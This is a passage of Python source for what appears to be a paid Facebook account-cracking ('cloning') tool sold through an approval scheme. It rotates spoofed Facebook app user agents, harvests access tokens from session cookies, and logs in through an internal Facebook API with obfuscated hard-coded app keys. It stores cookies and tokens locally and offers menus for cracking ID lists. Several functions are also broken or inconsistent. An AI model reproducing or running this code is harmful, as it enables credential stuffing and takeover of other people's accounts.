    ua = 'Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;R2097W AppleWebKit/537.36 (KHTML, like Gecko)96 0 6586 71 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;A1221G AppleWebKit/537.36 (KHTML, like Gecko)81 0 5798 68 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;M7612S AppleWebKit/537.36 (KHTML, like Gecko)97 0 5759 74 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua
#------------[ THIS IS FOR METHOD 4 ]--------------# 
def FOUR():
    END = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;Y1226V AppleWebKit/537.36 (KHTML, like Gecko)100 0 6266 78 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;B9109S AppleWebKit/537.36 (KHTML, like Gecko)101 0 5891 144 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;Q689C AppleWebKit/537.36 (KHTML, like Gecko)84 0 6077 116 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;I9027H AppleWebKit/537.36 (KHTML, like Gecko)84 0 6648 45 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;B8736K AppleWebKit/537.36 (KHTML, like Gecko)80 0 5973 86 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;Y3236Q AppleWebKit/537.36 (KHTML, like Gecko)96 0 6111 88 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua 
#------------[ THIS IS FOR METHOD 5 ]--------------#   
def FIVE(): 
    END = 'Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;R5331A AppleWebKit/537.36 (KHTML, like Gecko)96 0 6051 149 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;R1085L AppleWebKit/537.36 (KHTML, like Gecko)95 0 6685 139 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;B898K AppleWebKit/537.36 (KHTML, like Gecko)94 0 5998 136 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;I5256B AppleWebKit/537.36 (KHTML, like Gecko)90 0 6424 147 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;I3878C AppleWebKit/537.36 (KHTML, like Gecko)89 0 6331 98 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;E1001W AppleWebKit/537.36 (KHTML, like Gecko)101 0 5939 73 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua 
#------------[ THIS IS FOR METHOD 6 ]--------------# 
def SIX():
    END = 'Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;U9376U AppleWebKit/537.36 (KHTML, like Gecko)92 0 6098 137 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;H1627J AppleWebKit/537.36 (KHTML, like Gecko)97 0 5926 73 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;U9119M AppleWebKit/537.36 (KHTML, like Gecko)89 0 6008 108 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;R1159Z AppleWebKit/537.36 (KHTML, like Gecko)89 0 6438 145 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;B8984D AppleWebKit/537.36 (KHTML, like Gecko)95 0 6220 79 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;H7939F AppleWebKit/537.36 (KHTML, like Gecko)93 0 6252 93 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua          
#------------[ THIS IS FOR METHOD 7 ]--------------#   
def SEVEN():  
    END = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;L788A AppleWebKit/537.36 (KHTML, like Gecko)101 0 6479 41 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;S1751U AppleWebKit/537.36 (KHTML, like Gecko)95 0 6191 42 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;V5405U AppleWebKit/537.36 (KHTML, like Gecko)86 0 6371 124 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;D647Z AppleWebKit/537.36 (KHTML, like Gecko)83 0 6696 80 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;J8967W AppleWebKit/537.36 (KHTML, like Gecko)83 0 6226 101 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;Z847X AppleWebKit/537.36 (KHTML, like Gecko)85 0 6086 78 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua  
#------------[ THIS IS FOR METHOD 8 ]--------------#  
def EIGHT():
    END = 'Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;F9856V AppleWebKit/537.36 (KHTML, like Gecko)96 0 5736 43 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;C4220I AppleWebKit/537.36 (KHTML, like Gecko)98 0 6593 65 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;M2357X AppleWebKit/537.36 (KHTML, like Gecko)102 0 6456 77 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;O4444M AppleWebKit/537.36 (KHTML, like Gecko)80 0 6117 78 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;X4723Y AppleWebKit/537.36 (KHTML, like Gecko)85 0 5980 147 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;V1778S AppleWebKit/537.36 (KHTML, like Gecko)83 0 6403 55 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua 
def ankit():
 ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_31"])
 END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
 ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 [FBAN/FBIOS;FBAV/455.0.0.50.103;FBBV/575929547;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/17.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/577606372]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/451.0.4.35.109;FBBV/566175818;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/569806594]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/455.0.0.50.103;FBBV/575929547;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/577535201]"])+END
 return ua 

	
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
logincookie=[]
version='OPEN SOURCE'
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
coki= []
	
#------------[  LOGO ]--------------#               
 
logo = ("""\033[1;37m

\t\t ℕ𝕆𝕋 𝔸ℕ𝕂𝕀𝕋 \x1b[38;5;196mPRO\x1b[37m\n
        \033[32;34;37m############################
""") 
print(logo)
def linex():
    print('————————————————————————————————————————————')
    #print("\033[1;91m[\033[1;92m√\033[1;91m] \033[10;93m𝚃𝙾𝙳𝙰𝚈'𝚂 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)       
def clear():
	os.system('clear')
	print(logo)
	#print(f"\033[1;36m PUT YOUR NAME LIKE Hamid, Hassan, Muskan, Ayesha ")
#NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NAME : ')	
A = '\x1b[1;97m'    
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#------------[ ADDED APPROVAL ]--------------#            
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 10 DEYS 150TK 30 400TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] BYPASSER YOUR PHONE GONE🙄🤣 """)


def update():
    print('\033[1;32m SO SORRY BUT TODAY IS UPDATE \n TOOL IS UNDER MAINTENANCE \n BE PATIENT ')
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  
  try:
    httpCaht = requests.get('https://github.com/ankit848/approvals/blob/main/uid.txt').text
    if id in httpCaht:
      #print(fuckyoursali)
     # print(hedaborakarent)
      msg = str(os.geteuid())
     # time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(f"{GREEN} YOUR KEY : NOT-"+id)	
      print('\033[1;37m————————————————————————————————————————————————————————')
      print('————————————————————————————————————————————————————————')
      print(' SEND 200 NPR FOR 7 DAYS APPROVAL')
      print('————————————————————————————————————————————————————————')
      print(' SEND 500 NPR FOR 30 DAYS APPROVAL')
      print('————————————————————————————————————————————————————————')
      print(' 5$ FOR 30 DAYS APPROVAL')
      print('————————————————————————————————————————————————————————')
      print(' DAILY GOT LUSH UPDATES ')
      print('————————————————————————————————————————————————————————')
      print(' SIUU ')
      print('————————————————————————————————————————————————————————')
      print(' NOTICE KAM PAY KARNE WALO KO APPROVAL NHI MILEGA\n————————————————————————————————————————————————————————\n AGAR FB UPDATE JATA H TOO ISME TOOL P IDZ NHI AAYA TO MERA KOI KASOOR NHI H\n————————————————————————————————————————————————————————\n APPOVAL LENE K BAAD PAY KOI WAPSI NHI HOGA AND PHONE RESET HOGAYA GHUM HOGAYA TO AGAIN APPROVAL NHI MILEGA\n————————————————————————————————————————————————————————\n ANKIT TOOL AP LENA CHATEHO TO LESAKTE HO APKI MARJI APNPAY KARKE PAY RETURN NHI BOLPOGE\n————————————————————————————————————————————————————————\n THANK YOU AND ENJOY ANKIT TOOLS\n————————————————————————————————————————————————————————')
      input(' IF YOU ARE A FREE USER NIKLI MACHIKNEYYYY ')
      print('————————————————————————————————————————————————————————')
      meyexudi()
  except:
    sys.exit()
meyexudi()	

import requests
import os
import json
import re
import random
import time

ses = requests.Session()  # Define session globally

def _qlog():
    os.system("clear")
    print(logo)
   
    try:
        option = input("\n\033[1;37mChoose an option:\n1. Login with Basic Authentication\n2. Login with Email and Password\nEnter your choice: \033[0m")
        if option == "1":
            basic_login()
        elif option == "2":
            email_pass_login()
        else:
            print("Invalid option. Please choose 1 or 2.")
            _qlog()
    except Exception as e:
        print("Error occurred:", e)

def basic_login():
    try:
        cookie = input("\n\033[1;37mEnter your Facebook cookie: \033[0m")
        url = "https://business.facebook.com/business_locations"
        head = {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
            "referer": "https://www.facebook.com/",
            "host": "business.facebook.com",
            "origin": "https://business.facebook.com",
            "upgrade-insecure-requests": "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type": "text/html; charset=utf-8"
        }
        cok = {'cookie': cookie}
        try:
            data = ses.get(url, headers=head, cookies=cok)            
            token = re.search('(EAAG\w+)', data.text).group(1)
            open('/sdcard/.cok.txt', 'w').write(cookie)
            open('/sdcard/.token.txt', 'w').write(token)
            cek_apk(token, coki)  # Call function to check active and expired apps
        except ValueError:
            _qlog()
        except IOError:
            os.system('rm -rf /sdcard/.token.txt')
            os.system('rm -rf /sdcard/.cok.txt')
            print("\033[1;91mCookie In Checkpoint\033[0m")
            time.sleep(2)
        except UnboundLocalError:
            exit(f"Run again")
    except Exception as e:
        print("Error occurred during login:", e)

def email_pass_login():
    try:
        print("Using New Account Has No Checkpoint")
        print(50 * '=')
        em = input('Enter your email or ID: ')
        ps = input('Enter your password: ')
        e = "5990"
        ee = "655"
        eee = "59"
        tok1 = f"2377{e}9{eee}1{ee}"
        ei = "0f140aabedfb65"
        ei2 = "a2263b1"
        tok2 = f"25257C{ei}ac27a739ed1{ei2}"
        us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
        head = {
            "user-agent": us,
            "referer": "https://www.facebook.com/",
            "host": "b-api.facebook.com",
            "origin": "https://business.facebook.com",
            "upgrade-insecure-requests": "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type": "text/html; charset=utf-8"
        }
        li = "b-api"
        lo = "od/auth.l"
        op = "3f555f98"
        op2 = "d7aa0c"
        op3 = "58f522efm"
        sig = f"{op}fb61fc{op2}44f{op3}"
        p = ses.get(f'https://{li}.facebook.com/method/login?access_token={tok1}%{tok2}&format=json&sdk_version=1&email={em}&locale=en_US&password={ps}&sdk=ios&generate_session_cookies=1&sig={sig}', headers=head)
        po = json.load(p)
        if 'access_token' in po:
            toke = po['access_token']
            print('\033[1;32mLogin Done :-X')
            print('\033[1;36mToken ' + token)
            print(50 * '\033[0m-')
            open('.token.txt', 'w').write(token)
            cek_apk(token, coki)  # Call function to check active and expired apps
            exit('run again python main.py')
        else:
            if 'www.facebook.com' in po['error_msg']:
                print('\033[1;33mAccount Is In Checkpoint\033[0m')
                exit(em + '|' + ps)
            else:
                exit('\033[1;31mWrong Id/Email Or Password\033[0m')
    except Exception as e:
        print("Error occurred during login:", e)

#------------[ ID CREATE DATE ]--------------#       
def joined(ids):
    if len(ids) == 15:
        if ids[:10] == '1000000000':
            creation = '\33[1;32m| \33[1;32m2009'
        elif ids[:9] == '100000000':
            creation = '\33[1;32m| \33[1;32m2009'
        elif ids[:8] == '10000000':
            creation = '\33[1;32m| \33[1;32m2009'
        elif ids[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            creation = '\33[1;32m| \33[1;33m2009'
        elif ids[:7] in ['1000006', '1000007', '1000008', '1000009']:
            creation = '\33[1;32m| \33[1;32m2010'
        elif ids[:6] == '100001':
            creation = '\33[1;32m| \33[1;32m2010\33[1;32m/\33[1;32m2011'
        elif ids[:6] in ['100002', '100003']:
            creation = '\33[1;32m| \33[1;32m2011\33[1;32m/\33[1;32m2012'
        elif ids[:6] == '100004':
            creation = '\33[1;32m| \33[1;32m2012\33[1;32m/\33[1;32m2013'
        elif ids[:6] in ['100005', '100006']:
            creation = '\33[1;32m| \33[1;32m2013\33[1;32m/\33[1;32m2014'
        elif ids[:6] in ['100007', '100008']:
            creation = '\33[1;32m| \33[1;3wm2014\33[1;32m/\33[1;32m2015'
        elif ids[:6] == '100009':
            creation = '\33[1;32m| \33[1;32m2015'
        elif ids[:5] == '10001':
            creation = '\33[1;32m| \33[1;32m2015\33[1;32m/\33[1;32m2016'
        elif ids[:5] == '10002':
            creation = '\33[1;32m| \33[1;32m2016\33[1;32m/\33[1;32m2017'
        elif ids[:5] == '10003':
            creation = '\33[1;32m| \33[1;32m2018\33[1;32m/\33[1;32m2019'
        elif ids[:5] == '10004':
            creation = '\33[1;32m| \33[1;32m2019\33[1;32m/\33[1;32m2020'
        elif ids[:5] == '10005':
            creation = '\33[1;32m| \33[1;32m2020'
        elif ids[:5] in ['10006', '10007', '']:
            creation = '\33[1;32m| \33[1;32m2021'
        elif ids[:5] == '10008':
            creation = '\33[1;32m| \33[1;32m2022'
        elif ids[:5] == '10009':
            creation = '\32[1;32m| \32[1;33m2022\32[1;32m/\32[1;32m2023'
        elif ids[:4] == '6155':
            creation = '\32[1;32m| \32[1;32m2023'
        else:
            creation = ''
    elif len(ids) in [9, 10]:
        creation = '\33[1;32m| \33[1;32m2008/2009'
    elif len(ids) == 8:
        creation = '\33[1;32m| \33[1;32m2007/2008'
    elif len(ids) == 7:
        creation = '\33[1;32m| \33[1;32m2006/2007'
    else:
        creation = ''
    return creation

# Example usage:
#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "    
 #------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    linex()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        linex()
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()   
##--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	print(""" \x1b[38;5;196m>>\x1b[37m USE DATR COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m LOGIN USING COOKIE """)
	print(""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m JOIN GROUPS  """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '0':
		groups()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"})
	                    
					response = rsn.get('https://business.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------[ APPS CHECKER ]--------------#
cek_apk= []          
check_apps= []
import requests
from bs4 import BeautifulSoup

# ANSI escape codes for text colors
RESET = '\033[0m'       # Reset all attributes
BOLD = '\033[1m'        # Bold
YELLOW = '\033[93m'     # Yellow
RED = '\033[91m'        # Red

def print_section_header(header_text):
    """Prints section header with a line separator"""
    line = '-' * len(header_text)
    print(f'{BOLD}{line}{RESET}')
    print(f'{BOLD}{header_text}{RESET}')
    print(f'{BOLD}{line}{RESET}')

def siuu():
    """Prints a line"""
    print('-' * 50)

def cek_apk(session, coki):
    try:
        # Get active apps
        active_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
        active_soup = BeautifulSoup(active_response, "html.parser")
        active_apps = [i.text for i in active_soup.find_all("h3")]

        # Get expired apps
        expired_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
        expired_soup = BeautifulSoup(expired_response, "html.parser")
        expired_apps = [i.text for i in expired_soup.find_all("h3")]

        # Print active apps section
        print_section_header("Active Apps:")
        if active_apps:
            for idx, app in enumerate(active_apps, start=1):
                print(f"{YELLOW}{app}{RESET}")
                if idx != len(active_apps):
                    linex()
        else:
            print("No active apps found.")
        siuu()

        # Print expired apps section
        print_section_header("Expired Apps:")
        if expired_apps:
            for idx, app in enumerate(expired_apps, start=1):
                print(f"{RED}{app}{RESET}")
                if idx != len(expired_apps):
                    linex()
        else:
            print("No expired apps found.")
        siuu()

        # Print last line
        print(f'{BOLD}Last line for termination.{RESET}')
    except Exception as e:
        print(f'{BOLD}Error occurred while checking apps: {e}{RESET}')

# Example usage:
#check_apps("your_cookie_here")

# Call this function with user ID and cookie after successful login to check apps
# cek_apk(ids, coki)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]


		
		
#------------[ ANKIT MENU ]--------------#            
def menu():
    try:         
               # alvino_xy("""YOU NEED TO PUT YOUR PASSWORD FOR SECURITY""")
                #passask()
                
                clear()
                linex()
                animation(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
                animation(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
                linex()
	
                
                x = ("***")
                if x == ("***"):
                	    #print("\033[1;91m[\033[1;92m√\033[1;91m] \033[10;93m𝚃𝙾𝙳𝙰𝚈'𝚂 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)                       	    
                	   # print(" "+date)  
                	    #print('\033[1;37m')	     
                	    
                        animation(f""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CRACK FILE""")          
                        animation(f""" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m RANDOM CLONING""")
                        animation(f""" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m PUBLIC CLONING""")   
                        animation(f""" \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m CREATE FILE""")        
